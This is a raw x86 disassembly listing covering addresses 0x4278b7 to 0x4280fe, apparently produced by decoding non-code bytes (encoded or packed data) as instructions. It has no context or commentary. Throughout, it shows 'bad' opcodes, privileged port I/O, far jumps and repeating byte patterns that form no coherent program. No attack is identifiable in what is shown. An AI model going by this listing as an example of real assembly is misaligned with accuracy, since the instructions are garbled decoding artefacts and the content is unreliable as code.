  4278b7:	(bad)  
  4278b8:	(bad)  
  4278b9:	std    
  4278ba:	(bad)  
  4278bb:	jle    0x42791b
  4278bd:	xchg   BYTE PTR [edi+0x5a22643],cl
  4278c3:	fstp   DWORD PTR [eax-0x21]
  4278c6:	adc    DWORD PTR [ebx-0x9],edx
  4278c9:	mov    ds:0xdf58e8cb,al
  4278ce:	adc    edi,edx
  4278d0:	adc    esp,DWORD PTR [ebx-0x9]
  4278d3:	xlat   BYTE PTR ds:[ebx]
  4278d4:	or     DWORD PTR [edx+0x3ca10d57],esp
  4278da:	(bad)  
  4278dc:	loope  0x4278f2
  4278de:	enter  0x25be,0x3a
  4278e2:	lea    ecx,[ebp-0x7f106880]
  4278e8:	xlat   BYTE PTR ds:[ebx]
  4278e9:	and    DWORD PTR [eax-0x187f1059],eax
  4278ef:	and    DWORD PTR [ebx+0x32],edx
  4278f2:	pusha  
  4278f3:	fistp  DWORD PTR [eax-0x21]
  4278f6:	adc    DWORD PTR [ebx-0x4a],edx
  4278f9:	or     DWORD PTR [esi-0x3e],eax
  4278fc:	or     al,0xb2
  4278fe:	mov    BYTE PTR [ebx+edx*2],cl
  427901:	dec    ebp
  427902:	mov    dl,0xb4
  427904:	sub    DWORD PTR [eax-0x29],edx
  427907:	enter  0x9cff,0x80
  42790b:	out    0xc8,eax
  42790d:	cli    
  42790e:	lea    ecx,[ebp+0x453cd8d]
  427914:	inc    DWORD PTR [esi]
  427916:	and    BYTE PTR [edi+0x50238025],0xa7
  42791d:	xor    ah,BYTE PTR [ebx+0x3]
  427920:	xlat   BYTE PTR ds:[ebx]
  427921:	outs   dx,DWORD PTR ds:[esi]
  427922:	push   ebx
  427923:	jb     0x427988
  427925:	pushf  
  427926:	aad    0xb0
  427928:	dec    ebp
  427929:	xlat   BYTE PTR ds:[ebx]
  42792a:	xor    eax,0x4d25d780
  42792f:	xlat   BYTE PTR ds:[ebx]
  427930:	sub    eax,0x4d8ad74d
  427935:	pop    ecx
  427936:	xchg   BYTE PTR [ebx],dh
  427938:	dec    ebx
  427939:	dec    ebp
  42793a:	dec    ebp
  42793b:	push   eax
  42793c:	outs   dx,DWORD PTR ds:[esi]
  42793d:	mov    esi,0x8d8d8dfa
  427942:	adc    BYTE PTR [edi+0x21e780ef],0x53
  427949:	mov    edx,DWORD PTR [ebx-0x4a]
  42794c:	or     DWORD PTR [esi-0x7b],eax
  42794f:	or     al,0xb2
  427951:	popa   
  427952:	or     al,0x50
  427954:	out    0xc8,eax
  427956:	and    bh,0xef
  427959:	and    BYTE PTR [edi+0x29bcb221],0x53
  427960:	or     eax,0x53c8d780
  427965:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427966:	dec    DWORD PTR [ebx-0x80]
  427969:	out    0x71,eax
  42796b:	push   ebx
  42796c:	retf   
  42796d:	call   DWORD PTR [eax+eax*4-0x7dacea59]
  427974:	cmp    BYTE PTR [eax+eax*4-0x19],0x71
  427979:	adc    BYTE PTR [ecx],0x80
  42797c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42797d:	adc    eax,0xcfd4609
  427982:	mov    dl,0xbc
  427984:	sub    DWORD PTR [ebx-0x5c],edx
  427987:	mov    dl,0xbe
  427989:	or     al,0xa2
  42798b:	dec    ebx
  42798c:	lea    ecx,[ebp+0x74ffcd8d]
  427992:	jmp    FWORD PTR [edx]
  427994:	arpl   di,si
  427996:	xlat   BYTE PTR ds:[ebx]
  427997:	sbb    DWORD PTR [ebx+0x5],esp
  42799a:	xlat   BYTE PTR ds:[ebx]
  42799b:	nop
  42799c:	dec    edx
  42799d:	push   ebx
  42799e:	test   DWORD PTR [esi],ebx
  4279a0:	jne    0x427961
  4279a2:	push   0xffffffc8
  4279a4:	outs   dx,DWORD PTR ds:[esi]
  4279a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4279a6:	jbe    0x4279dc
  4279a8:	push   ebx
  4279a9:	test   DWORD PTR [esi],ebx
  4279ab:	jne    0x427971
  4279ad:	stos   BYTE PTR es:[edi],al
  4279ae:	xor    BYTE PTR [edi-0x11],0x80
  4279b2:	lock and DWORD PTR [eax-0x287f1069],eax
  4279b9:	and    DWORD PTR [edx+0x438f8605],esp
  4279bf:	es push edi
  4279c1:	fistp  DWORD PTR [eax-0x21]
  4279c4:	adc    DWORD PTR [ecx],ecx
  4279c6:	inc    esi
  4279c7:	std    
  4279c8:	or     al,0x80
  4279ca:	ret    0x4d53
  4279cd:	push   ebx
  4279ce:	jb     0x427982
  4279d0:	add    ch,BYTE PTR [ecx]
  4279d2:	push   ebx
  4279d3:	test   DWORD PTR [edx+0xba20cbe],esi
  4279d9:	lea    ecx,[ebp+0x7cffcd8d]
  4279df:	call   DWORD PTR [ecx+0x5f]
  4279e2:	ja     0x42796e
  4279e4:	xlat   BYTE PTR ds:[ebx]
  4279e5:	out    dx,al
  4279e6:	arpl   WORD PTR [esi+0x47a221d5],si
  4279ec:	fisubr WORD PTR [eax+0x2d]
  4279ef:	mov    ds:0xe3bb390a,al
  4279f4:	les    esp,FWORD PTR [esi-0x5e2bc85e]
  4279fa:	adc    edx,ebp
  4279fc:	pop    esp
  4279fd:	js     0x427a23
  4279ff:	xor    ch,BYTE PTR [ebx-0x48f5c57]
  427a05:	sub    eax,0x8780978d
  427a0a:	in     eax,dx
  427a0b:	xchg   DWORD PTR [ecx],esp
  427a0d:	xor    BYTE PTR [edi-0x11],0x80
  427a11:	lock and DWORD PTR [ecx],ecx
  427a14:	inc    esi
  427a15:	std    
  427a16:	or     al,0xb2
  427a18:	mov    esi,0xeff0800c
  427a1d:	adc    BYTE PTR [edi-0x454d66df],0x29
  427a24:	xor    al,0x1d
  427a27:	cli    
  427a28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427a29:	mov    DWORD PTR [esp+edx*8],0x7253fc53
  427a30:	(bad)  
  427a31:	sti    
  427a32:	push   eax
  427a33:	cmp    al,BYTE PTR [eax-0x327fda89]
  427a39:	cmp    cl,BYTE PTR ss:[ebp-0x7f107f73]
  427a40:	ja     0x427a67
  427a42:	or     ch,0x36
  427a45:	cmp    cl,BYTE PTR [ebp-0x13727f73]
  427a4b:	xchg   edx,eax
  427a4c:	gs xor al,0x25
  427a50:	adc    BYTE PTR [eax+0x32],0x3a
  427a54:	lea    ecx,[ebp-0x1dea8080]
  427a5a:	out    dx,al
  427a5b:	mov    ebp,0x8d8d818d
  427a60:	dec    ebp
  427a61:	push   edx
  427a62:	or     ch,BYTE PTR [edx-0x73af49b3]
  427a68:	xor    BYTE PTR [edi-0x11],0x80
  427a6c:	lock and DWORD PTR [ecx],ecx
  427a6f:	inc    esi
  427a70:	std    
  427a71:	or     al,0xb2
  427a73:	mov    esi,0xeff0800c
  427a78:	adc    BYTE PTR [edi+0x25d74d21],0x53
  427a7f:	cld    
  427a80:	push   ebx
  427a81:	jb     0x427a82
  427a83:	sti    
  427a84:	push   eax
  427a85:	ja     0x427a11
  427a87:	add    DWORD PTR [edi-0x76],esi
  427a8a:	or     bl,BYTE PTR [ebx-0x4de228b3]
  427a90:	mov    edx,0x15d74d29
  427a95:	dec    ebp
  427a96:	xlat   BYTE PTR ds:[ebx]
  427a97:	jno    0x427ae6
  427a99:	xlat   BYTE PTR ds:[ebx]
  427a9a:	and    DWORD PTR [ebp-0x29],ecx
  427a9d:	out    dx,eax
  427a9e:	xchg   BYTE PTR [ebx],dh
  427aa0:	int3   
  427aa1:	dec    ebp
  427aa2:	dec    ebp
  427aa3:	xor    BYTE PTR [edi-0x11],0x80
  427aa7:	lock and DWORD PTR [ecx],ecx
  427aaa:	inc    esi
  427aab:	std    
  427aac:	or     al,0xb2
  427aae:	mov    esi,0xeff0800c
  427ab3:	adc    BYTE PTR [edi+0x53fc5321],0x72
  427aba:	mov    dl,0xba
  427abc:	sub    DWORD PTR [eax+0x63fbff09],eax
  427ac2:	std    
  427ac3:	aad    0x37
  427ac5:	xor    BYTE PTR [edi+0x71],0x80
  427ac9:	lock adc eax,0xcfd4609
  427acf:	mov    dl,0xbe
  427ad1:	or     al,0x80
  427ad3:	lock jno 0x427a56
  427ad6:	xchg   edi,eax
  427ad7:	adc    eax,0x7253fc53
  427adc:	mov    dl,0xba
  427ade:	sub    DWORD PTR [eax-0x400e210],eax
  427ae4:	or     DWORD PTR [edx],esp
  427ae6:	ja     0x427a72
  427ae8:	push   eax
  427ae9:	cmp    ch,BYTE PTR [ecx-0x72e20490]
  427aef:	xchg   edi,eax
  427af0:	add    BYTE PTR [edi-0x64666c6a],0x53
  427af7:	push   0xffffff80
  427af9:	xlat   BYTE PTR ds:[ebx]
  427afa:	cmp    eax,0x80459780
  427aff:	out    0x25,eax
  427b01:	pop    esi
  427b02:	xchg   BYTE PTR [edi-0x249fd9bd],cl
  427b08:	pop    eax
  427b09:	fist   WORD PTR [ecx]
  427b0b:	arpl   di,si
  427b0d:	or     esi,ecx
  427b0f:	dec    esp
  427b10:	lea    ecx,[ebp-0x3960fe73]
  427b16:	in     al,0xee
  427b18:	arpl   si,ax
  427b1a:	(bad)  
  427b1c:	arpl   si,ax
  427b1e:	xlat   BYTE PTR ds:[ebx]
  427b1f:	out    dx,eax
  427b20:	arpl   di,si
  427b22:	or     DWORD PTR [edi],ecx
  427b24:	pop    ss
  427b25:	or     al,0x8d
  427b27:	lea    esp,[edx-0x20a755f3]
  427b2d:	adc    edi,edx
  427b2f:	out    dx,eax
  427b30:	arpl   di,si
  427b32:	or     DWORD PTR [edi],ecx
  427b34:	das    
  427b35:	or     al,0x8d
  427b37:	lea    esp,[edx-0x20a766f3]
  427b3d:	adc    edi,edx
  427b3f:	out    dx,eax
  427b40:	arpl   di,si
  427b42:	or     DWORD PTR [edi],ecx
  427b44:	dec    ebx
  427b45:	lea    ecx,[ebp-0x56f25d73]
  427b4b:	pop    eax
  427b4c:	fist   WORD PTR [ecx]
  427b4e:	xlat   BYTE PTR ds:[ebx]
  427b4f:	out    dx,al
  427b50:	arpl   di,si
  427b52:	aad    0x3f
  427b54:	mov    ds:0xdf58d00d,al
  427b59:	adc    edi,edx
  427b5b:	out    dx,eax
  427b5c:	arpl   di,si
  427b5e:	or     DWORD PTR [edi],ecx
  427b60:	mov    al,ds:0xa28d8d3a
  427b65:	or     eax,0x11df58b9
  427b6a:	or     DWORD PTR [edi-0x24],ecx
  427b6d:	cmp    cl,BYTE PTR [ebp+0x9f7638d]
  427b73:	(bad)  
  427b75:	lea    ecx,[ebp+0x3aa2be8d]
  427b7b:	lea    ecx,[ebp+0x4d1dd74d]
  427b81:	xlat   BYTE PTR ds:[ebx]
  427b82:	sub    eax,0x4d15d74d
  427b87:	xlat   BYTE PTR ds:[ebx]
  427b88:	jno    0x427bd7
  427b8a:	xlat   BYTE PTR ds:[ebx]
  427b8b:	and    DWORD PTR [ebp-0x29],ecx
  427b8e:	out    dx,eax
  427b8f:	xchg   bl,dl
  427b91:	or     eax,0xb7be4d4d
  427b96:	cmp    cl,BYTE PTR [ebp-0x3ef25d73]
  427b9c:	pop    eax
  427b9d:	fist   WORD PTR [ecx]
  427b9f:	xlat   BYTE PTR ds:[ebx]
  427ba0:	out    dx,eax
  427ba1:	arpl   di,si
  427ba3:	or     DWORD PTR [edi],ecx
  427ba5:	loope  0x427b34
  427ba7:	lea    ecx,[ebp+0x58e40da2]
  427bad:	fist   WORD PTR [ecx]
  427baf:	xlat   BYTE PTR ds:[ebx]
  427bb0:	out    dx,eax
  427bb1:	arpl   di,si
  427bb3:	or     DWORD PTR [edi],ecx
  427bb5:	mov    cl,0x3a
  427bb7:	lea    ecx,[ebp+0x58d90da2]
  427bbd:	fist   WORD PTR [ecx]
  427bbf:	xlat   BYTE PTR ds:[ebx]
  427bc0:	out    dx,al
  427bc1:	arpl   di,si
  427bc3:	aad    0x1d
  427bc5:	mov    ds:0xdf58e60d,al
  427bca:	adc    edi,edx
  427bcc:	out    dx,eax
  427bcd:	arpl   di,si
  427bcf:	or     DWORD PTR [edi],ecx
  427bd1:	aam    0x3a
  427bd3:	lea    ecx,[ebp+0x58e80da2]
  427bd9:	fist   WORD PTR [ecx]
  427bdb:	les    eax,FWORD PTR [ecx]
  427bdd:	adc    BYTE PTR [edi+0x21d780ef],0x80
  427be4:	out    0xef,eax
  427be6:	and    BYTE PTR [edi+0x53325321],0xb6
  427bed:	or     DWORD PTR [esi-0x3e],eax
  427bf0:	or     al,0xb2
  427bf2:	mov    esp,0x8d4ba229
  427bf7:	lea    ecx,[ebp+0xc88b2cd]
  427bfd:	push   ebx
  427bfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427bff:	dec    DWORD PTR [ebx-0x80]
  427c02:	out    0xef,eax
  427c04:	call   DWORD PTR [eax+eax*4-0x6313de59]
  427c0b:	adc    eax,esi
  427c0d:	push   eax
  427c0e:	xchg   edi,eax
  427c0f:	out    dx,eax
  427c10:	push   eax
  427c11:	xlat   BYTE PTR ds:[ebx]
  427c12:	and    DWORD PTR [eax-0x287f1069],eax
  427c18:	and    DWORD PTR [eax-0x587f1019],eax
  427c1e:	and    DWORD PTR [ebx+0x32],edx
  427c21:	push   ebx
  427c22:	mov    dh,0x9
  427c24:	inc    esi
  427c25:	ret    0xb20c
  427c28:	mov    esp,0xb2a45329
  427c2d:	mov    BYTE PTR [edx+eiz*4],cl
  427c30:	dec    ebx
  427c31:	lea    ecx,[ebp-0x6b003273]
  427c37:	dec    DWORD PTR [ebx+0x3f]
  427c3a:	xchg   edi,eax
  427c3b:	jno    0x427c5c
  427c3d:	xlat   BYTE PTR ds:[ebx]
  427c3e:	adc    eax,0x803d9780
  427c43:	xlat   BYTE PTR ds:[ebx]
  427c44:	inc    ebp
  427c45:	adc    BYTE PTR [edi+0x15d78071],0x80
  427c4c:	xchg   edi,eax
  427c4d:	jno    0x427bcf
  427c4f:	xlat   BYTE PTR ds:[ebx]
  427c50:	adc    eax,0x8071e780
  427c55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427c56:	adc    eax,0xb6533253
  427c5b:	or     DWORD PTR [esi-0x3e],eax
  427c5e:	or     al,0xb2
  427c60:	mov    esp,0xa2a45329
  427c65:	dec    ebx
  427c66:	lea    ecx,[ebp-0x774d3273]
  427c6c:	or     al,0xff
  427c6e:	dec    ebx
  427c6f:	and    bh,0x3d
  427c72:	call   DWORD PTR [eax+eax*4-0x34acba59]
  427c79:	push   ebx
  427c7a:	add    BYTE PTR [eax-0xf7fc289],0x45
  427c81:	or     DWORD PTR [esi-0x54],eax
  427c84:	or     al,0x53
  427c86:	jo     0x427c3a
  427c88:	test   BYTE PTR [ecx],ch
  427c8a:	push   edi
  427c8b:	lea    ecx,[ebp-0x34003273]
  427c91:	xor    al,0x71
  427c94:	mov    dl,0xc4
  427c96:	or     al,0xff
  427c98:	sub    ah,0x9c
  427c9b:	adc    BYTE PTR [edi-0x1239eceb],0xba
  427ca2:	mov    dh,BYTE PTR [edx+0x6a532988]
  427ca8:	mov    ds:0xdf58d505,al
  427cad:	adc    DWORD PTR [edx+0x438f86c2],esp
  427cb3:	es and bh,0x3d
  427cb7:	and    BYTE PTR [edi-0x754312bb],0xa2
  427cbe:	dec    ebx
  427cbf:	aad    0x58
  427cc1:	fist   WORD PTR [ecx]
  427cc3:	mov    ds:0x438f86c6,al
  427cc8:	es in  al,dx
  427cca:	sub    al,BYTE PTR [eax-0x6becda19]
  427cd0:	(bad)  
  427cd1:	sti    
  427cd2:	push   edi
  427cd3:	xchg   BYTE PTR [edi-0xf5d9bd],cl
  427cd9:	add    eax,0x58d90ba2
  427cde:	fist   WORD PTR [ecx]
  427ce0:	cdq    
  427ce1:	dec    ebp
  427ce2:	xlat   BYTE PTR ds:[ebx]
  427ce3:	xor    eax,0x9b2dd74d
  427ce8:	dec    ebp
  427ce9:	xlat   BYTE PTR ds:[ebx]
  427cea:	sbb    eax,0x4d15d74d
  427cef:	xlat   BYTE PTR ds:[ebx]
  427cf0:	jno    0x427d3f
  427cf2:	xlat   BYTE PTR ds:[ebx]
  427cf3:	and    DWORD PTR [ebp-0x29],ecx
  427cf6:	out    dx,eax
  427cf7:	xchg   dh,al
  427cf9:	int3   
  427cfa:	dec    ebp
  427cfb:	dec    ebp
  427cfc:	push   eax
  427cfd:	mov    WORD PTR [eax-0x5c565474],es
  427d03:	jo     0x427d00
  427d05:	cmp    eax,0xef97808d
  427d0a:	adc    bh,0x21
  427d0d:	and    bh,0xef
  427d10:	and    BYTE PTR [edi+0x53b65321],0x32
  427d17:	or     DWORD PTR [esi-0x3e],eax
  427d1a:	or     al,0xb2
  427d1c:	mov    esp,0x8d4ba229
  427d21:	lea    ecx,[ebp+0xc88b2cd]
  427d27:	push   ebx
  427d28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427d29:	call   DWORD PTR [edi+edi*8+0x71e7804b]
  427d30:	and    BYTE PTR [edi-0x6300eb],0xc6
  427d37:	push   eax
  427d38:	xchg   edi,eax
  427d39:	jno    0x427d8b
  427d3b:	xlat   BYTE PTR ds:[ebx]
  427d3c:	adc    eax,0x803d9780
  427d41:	xlat   BYTE PTR ds:[ebx]
  427d42:	inc    ebp
  427d43:	adc    BYTE PTR [edi+0x15d78071],0x80
  427d4a:	xchg   edi,eax
  427d4b:	out    dx,eax
  427d4c:	adc    bh,0x21
  427d4f:	adc    BYTE PTR [edi+0x21d780ef],0x80
  427d56:	out    0xef,eax
  427d58:	and    BYTE PTR [edi+0x53b65321],0x32
  427d5f:	or     DWORD PTR [esi-0x3e],eax
  427d62:	or     al,0xb2
  427d64:	mov    esp,0x8d4ba229
  427d69:	lea    ecx,[ebp-0x5bac33]
  427d6f:	xchg   esp,eax
  427d70:	mov    dl,0x88
  427d72:	or     al,0xff
  427d74:	dec    ebx
  427d75:	and    bh,0x71
  427d78:	and    BYTE PTR [edi+0x53cb5315],0x82
  427d7f:	xor    BYTE PTR [edi+0x71],0x80
  427d83:	lock adc eax,0xcac4609
  427d89:	push   ebx
  427d8a:	jo     0x427d8b
  427d8c:	retf   
  427d8d:	mov    dl,0x84
  427d8f:	sub    DWORD PTR [edi-0x73],edx
  427d92:	lea    ecx,[ebp+0xcc4b2cd]
  427d98:	inc    DWORD PTR [edx-0x7fc28880]
  427d9e:	lock inc ebp
  427da0:	in     al,dx
  427da1:	pushf  
  427da2:	and    bh,0x3d
  427da5:	adc    eax,esi
  427da7:	and    BYTE PTR [edi-0x79fa5dbb],0x8f
  427dae:	inc    ebx
  427daf:	es push edi
  427db1:	fistp  DWORD PTR [eax-0x21]
  427db4:	adc    DWORD PTR [ecx],ecx
  427db6:	inc    esi
  427db7:	std    
  427db8:	or     al,0xb2
  427dba:	mov    esp,0xcbeb229
  427dbf:	push   ebx
  427dc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427dc1:	mov    ds:0x8d8d8d4b,al
  427dc6:	int    0xff
  427dc8:	sub    bh,bh
  427dca:	je     0x427db8
  427dcc:	not    DWORD PTR [ebx]
  427dce:	add    eax,0x80eff080
  427dd3:	xchg   edi,eax
  427dd4:	and    DWORD PTR [eax-0x587f8e19],eax
  427dda:	adc    eax,0xed8abaed
  427ddf:	mov    esp,0xd505a28a
  427de4:	pop    eax
  427de5:	fist   WORD PTR [ecx]
  427de7:	mov    ds:0xdf58d54b,al
  427dec:	adc    DWORD PTR [edx+0x6a532988],esi
  427df2:	mov    ds:0x438f86c2,al
  427df7:	mov    es:0x438f86c6,al
  427dfd:	es in  al,dx
  427dff:	sub    dl,BYTE PTR [ebx]
  427e01:	xchg   esp,eax
  427e02:	mov    esi,0x4d4d0d48
  427e07:	xchg   edi,eax
  427e08:	add    BYTE PTR [edi-0x66e27813],0x60
  427e0f:	fstp   DWORD PTR [eax-0x21]
  427e12:	adc    DWORD PTR [eax-0x10],edx
  427e15:	xor    bl,BYTE PTR [esi-0x7a]
  427e18:	pop    DWORD PTR [ebx+0x26]
  427e1b:	push   eax
  427e1c:	ja     0x427de6
  427e1e:	jl     0x427e97
  427e20:	xchg   ah,ah
  427e22:	pop    eax
  427e23:	fist   WORD PTR [ecx]
  427e25:	push   eax
  427e26:	ja     0x427daf
  427e28:	adc    BYTE PTR [edi-0x37287fce],0x9b
  427e2f:	or     DWORD PTR [esi-0x3e],eax
  427e32:	or     al,0xb2
  427e34:	mov    BYTE PTR [eax+eax*4],cl
  427e37:	xlat   BYTE PTR ds:[ebx]
  427e38:	xor    al,BYTE PTR [eax-0x5df53719]
  427e3e:	ret    0xc7a7
  427e41:	add    al,0xd4
  427e43:	push   ebx
  427e44:	dec    ebp
  427e45:	xchg   esi,eax
  427e46:	call   FWORD PTR [eax+edx*2-0x687f7569]
  427e4d:	and    DWORD PTR [eax-0x69],edx
  427e50:	and    DWORD PTR [ebp-0x29],ecx
  427e53:	and    DWORD PTR [ecx],eax
  427e55:	ja     0x427de1
  427e57:	dec    ebp
  427e58:	xlat   BYTE PTR ds:[ebx]
  427e59:	out    dx,eax
  427e5a:	mov    dl,0x2
  427e5c:	sub    DWORD PTR [edx],ecx
  427e5e:	dec    ebp
  427e5f:	xlat   BYTE PTR ds:[ebx]
  427e60:	and    DWORD PTR [ebp-0x29],ecx
  427e63:	xchg   DWORD PTR [ebp-0x29],ecx
  427e66:	xchg   BYTE PTR [ebp-0x29],cl
  427e69:	enter  0xd74d,0x32
  427e6d:	xchg   bh,ah
  427e6f:	mov    cl,BYTE PTR [ebp+0x4d]
  427e72:	stos   DWORD PTR es:[edi],eax
  427e73:	push   eax
  427e74:	ja     0x427e00
  427e76:	xor    BYTE PTR [edi-0x76],0xa9
  427e7a:	jo     0x427e77
  427e7c:	out    dx,eax
  427e7d:	lea    edx,[edi-0x6127880]
  427e83:	mov    ebp,ebp
  427e85:	xchg   DWORD PTR [ebp-0x67],eax
  427e88:	jl     0x427eff
  427e8a:	xor    eax,0x8d8d8d35
  427e8f:	lea    edi,[ebp+esi*2+0x35]
  427e93:	inc    ebp
  427e94:	lea    ecx,[ebp+0x75018d8d]
  427e9a:	xor    eax,0xd74d0a71
  427e9f:	xor    eax,0x4d2dd74d
  427ea4:	xlat   BYTE PTR ds:[ebx]
  427ea5:	and    eax,0x4d1dd74d
  427eaa:	xlat   BYTE PTR ds:[ebx]
  427eab:	adc    eax,0x4d71d74d
  427eb0:	xlat   BYTE PTR ds:[ebx]
  427eb1:	and    DWORD PTR [ebp-0x29],ecx
  427eb4:	out    dx,eax
  427eb5:	xchg   cl,bl
  427eb7:	mov    eax,0x77804d4d
  427ebc:	out    dx,eax
  427ebd:	push   eax
  427ebe:	jne    0x427ef5
  427ec0:	out    dx,al
  427ec1:	xor    BYTE PTR [ebp+0x35],0x35
  427ec5:	dec    edi
  427ec6:	push   0x9
  427ec8:	prefetcht0 BYTE PTR [ebp+0x75808d8d]
  427ecf:	xor    eax,0x96a4f45
  427ed4:	(bad)  
  427ed6:	lea    ecx,[ebp+0x35d54d8d]
  427edc:	and    eax,0x2535d54d
  427ee1:	dec    ebp
  427ee2:	aad    0x35
  427ee4:	and    eax,0x81357580
  427ee9:	dec    ebp
  427eea:	test   DWORD PTR [eax-0x7f11ca8b],0x80ee3575
  427ef4:	jne    0x427f2b
  427ef6:	out    dx,al
  427ef7:	add    DWORD PTR [edi-0x12],esi
  427efa:	push   eax
  427efb:	jne    0x427f32
  427efd:	out    dx,eax
  427efe:	xor    BYTE PTR [ebp+0x35],0x3d
  427f02:	in     al,dx
  427f03:	jne    0x427f3a
  427f05:	out    dx,al
  427f06:	push   eax
  427f07:	jne    0x427f3e
  427f09:	out    dx,al
  427f0a:	xor    BYTE PTR [ebp+0x35],0xee
  427f0e:	xor    BYTE PTR [ebp+0x35],0xee
  427f12:	xor    BYTE PTR [ecx],0x35
  427f15:	out    dx,al
  427f16:	adc    BYTE PTR [eax+0x26],0x3a
  427f1a:	lea    ecx,[ebp-0x2a7ff180]
  427f20:	xor    eax,0x2ecd80ef
  427f25:	cmp    cl,BYTE PTR [ebp+0x9195f8d]
  427f2b:	jmp    0x7180:0x8d8d3a16
  427f32:	add    BYTE PTR [ecx+0x165aa80],0x95
  427f39:	sbb    DWORD PTR [edx],ecx
  427f3b:	sub    BYTE PTR [esi-0x80],0x90
  427f3f:	in     al,dx
  427f40:	jle    0x427ec2
  427f42:	aad    0x35
  427f44:	out    dx,eax
  427f45:	pop    edi
  427f46:	sbb    DWORD PTR [ecx],ecx
  427f48:	in     eax,dx
  427f49:	fstp   TBYTE PTR [edx]
  427f4b:	lea    ecx,[ebp-0x10ca6a80]
  427f51:	sub    BYTE PTR [esi-0x80],0xa6
  427f55:	or     BYTE PTR [ebp-0x4d13aebd],0x50
  427f5c:	or     al,0xbe
  427f5e:	sar    BYTE PTR [edx],1
  427f60:	lea    ecx,[ebp+0x45357580]
  427f66:	dec    edi
  427f67:	push   0x9
  427f69:	dec    edi
  427f6a:	cdq    
  427f6b:	cmp    cl,BYTE PTR [ebp+0x3575808d]
  427f71:	out    dx,al
  427f72:	or     ch,0x2e
  427f75:	cmp    cl,BYTE PTR [ebp+0x508d808d]
  427f7b:	jne    0x427fb2
  427f7d:	and    DWORD PTR [eax-0x7f11ca8b],eax
  427f83:	int    0x26
  427f85:	cmp    cl,BYTE PTR [ebp+0x508d808d]
  427f8b:	jne    0x427fc2
  427f8d:	and    DWORD PTR [eax-0x7f11ca8b],eax
  427f93:	int    0x10
  427f95:	cmp    cl,BYTE PTR [ebp-0x7f727f73]
  427f9b:	lea    edx,[eax+0x75]
  427f9e:	xor    eax,0x35758021
  427fa3:	out    dx,al
  427fa4:	or     ch,0x41
  427fa7:	cmp    cl,BYTE PTR [ebp-0x7f727f73]
  427fad:	lea    edx,[eax+0x75]
  427fb0:	xor    eax,0x35758021
  427fb5:	out    dx,al
  427fb6:	xor    BYTE PTR [ecx],0x35
  427fb9:	out    dx,al
  427fba:	or     ch,0x82
  427fbd:	cmp    cl,BYTE PTR [ebp-0x7daf7f73]
  427fc3:	cmp    cl,BYTE PTR [ebp-0x7f727f73]
  427fc9:	xor    dl,bh
  427fcb:	and    ah,BYTE PTR [edi+ebp*2]
  427fce:	cmp    BYTE PTR [ebx-0x4],dl
  427fd1:	in     eax,dx
  427fd2:	add    eax,0xc86b20d
  427fd7:	mov    dl,0xba
  427fd9:	sub    edi,edi
  427fdb:	std    
  427fdc:	push   eax
  427fdd:	xor    DWORD PTR ds:0x35757c21,esi
  427fe3:	out    dx,eax
  427fe4:	lea    ecx,[ebp+0x75808d8d]
  427fea:	xor    eax,0xd56a4f35
  427fef:	ret    
  427ff0:	xor    BYTE PTR [ebp+0x35],0x71
  427ff4:	in     eax,dx
  427ff5:	xchg   BYTE PTR [ebp-0x2a82272b],cl
  427ffb:	push   ebx
  427ffc:	jge    0x42807b
  427ffe:	aad    0x23
  428000:	jge    0x427fd9
  428002:	fmul   DWORD PTR [ebp-0x2b]
  428005:	xor    eax,0x35d54d2d
  42800a:	sub    eax,0x2d35d54d
  42800f:	dec    ebp
  428010:	aad    0x35
  428012:	sub    eax,0x55357580
  428017:	dec    ebp
  428018:	test   esp,0x35d54d39
  42801e:	and    eax,0x2535d54d
  428023:	dec    ebp
  428024:	aad    0x35
  428026:	and    eax,0x81357580
  42802b:	dec    ebp
  42802c:	test   esp,0x35d54d90
  428032:	adc    eax,0x3d357580
  428037:	dec    ebp
  428038:	test   esp,0x3575806f
  42803e:	xor    eax,0x7550f74d
  428043:	xor    eax,0x357580ef
  428048:	and    DWORD PTR [edi+0x6a],ecx
  42804b:	aad    0xa1
  42804d:	xor    BYTE PTR [ebp+0x35],0xee
  428051:	jl     0x428020
  428053:	test   BYTE PTR [edx],bh
  428055:	lea    ecx,[ebp+0x386f24f5]
  42805b:	xor    BYTE PTR [ebp+0x35],0xef
  42805f:	xor    BYTE PTR [ecx],0x35
  428062:	out    dx,al
  428063:	adc    BYTE PTR [eax-0x7d],0x3a
  428067:	lea    ecx,[ebp+0x757c3a50]
  42806d:	xor    eax,0x6f24f6ef
  428072:	cmp    BYTE PTR [eax-0x7f10ca8b],al
  428078:	xor    DWORD PTR ds:0xedfc53ef,esi
  42807e:	add    eax,0x29bab20d
  428083:	mov    dl,0x86
  428085:	or     al,0xff
  428087:	mov    dl,0x80
  428089:	xor    DWORD PTR ds:0xd7b26321,esi
  42808f:	and    eax,DWORD PTR [eax-0x7f11ca8b]
  428095:	xor    DWORD PTR ds:0x835080ee,esi
  42809b:	cmp    cl,BYTE PTR [ebp-0x7f91b273]
  4280a1:	int    0x32
  4280a3:	cmp    cl,BYTE PTR [ebp+0x3d0a4d8d]
  4280a9:	les    ebx,FWORD PTR [edi]
  4280ab:	add    DWORD PTR [edi-0x12],esi
  4280ae:	push   eax
  4280af:	jne    0x4280e6
  4280b1:	and    DWORD PTR [eax-0x7fdeca8b],eax
  4280b7:	xor    DWORD PTR ds:0xe55080ee,esi
  4280bd:	cmp    cl,BYTE PTR [ebp+0x3a30808d]
  4280c3:	out    dx,eax
  4280c4:	xor    BYTE PTR [ebp+0x35],0xee
  4280c8:	or     ch,0x87
  4280cb:	cmp    cl,BYTE PTR [ebp-0x7f10b273]
  4280d1:	xor    DWORD PTR ds:0x865080ee,esi
  4280d7:	cmp    cl,BYTE PTR [ebp+0x18d808d]
  4280dd:	out    dx,al
  4280de:	mov    ds:0xee353180,al
  4280e3:	adc    BYTE PTR [eax-0x1b],0x3a
  4280e7:	lea    ecx,[ebp+0x30808d80]
  4280ed:	cmp    ch,bh
  4280ef:	test   eax,0xfba7b880
  4280f4:	sub    eax,0x614c748d
  4280f9:	imul   edi,DWORD PTR [ecx+0x62],0x69
  4280fd:	popa   
  4280fe:	push   0x6c656548
